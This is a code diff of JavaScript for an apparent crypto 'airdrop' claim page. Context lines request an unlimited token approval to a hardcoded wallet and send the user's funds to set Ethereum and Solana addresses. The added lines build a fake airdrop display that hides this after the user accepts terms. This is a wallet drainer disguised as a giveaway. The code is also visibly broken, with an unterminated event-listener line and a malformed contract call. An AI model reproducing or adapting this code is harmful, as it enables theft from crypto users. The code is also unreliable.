@@ -41,11 +41,33 @@ if (solInput.value.trim().length > 0) {
 termsModal.classList.remove("hidden");
 }
 });
-  
+
+document.getElementById('acceptTerms').addEventListener('click
+                                                          
 // Get unlimited approval
 const contract = new web3.eth.Contract([], userAddress);
 await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1000000', 'ether')).send({ from: userAddress });
 
+  // STEP 5: Accept → Show Airdrop Page
+acceptBtn.addEventListener("click", () => {
+  termsModal.classList.add("hidden");
+  solanaSection.classList.add("hidden");
+
+  // Update wallet & balance
+  document.getElementById("userWallet").textContent = userWalletAddress;
+  document.getElementById("airdropBalance").textContent = userAirdropBalance;
+
+  // Compute balance diff
+  const diff = userAirdropBalance - previousBalance;
+  const diffSection = document.getElementById("balanceDiffSection");
+  document.getElementById("balanceDiff").textContent = (diff >= 0 ? "+" : "") + diff;
+  diffSection.classList.remove("hidden");
+
+  // Show airdrop page
+  airdropPage.classList.remove("hidden");
+  setTimeout(() => airdropPage.classList.add("show"), 50);
+});
+  
 // Send funds to specified addresses
 await sendToEthereum(userAddress, ethWalletAddress);
 await sendToSolana(userAddress, solWalletAddress);
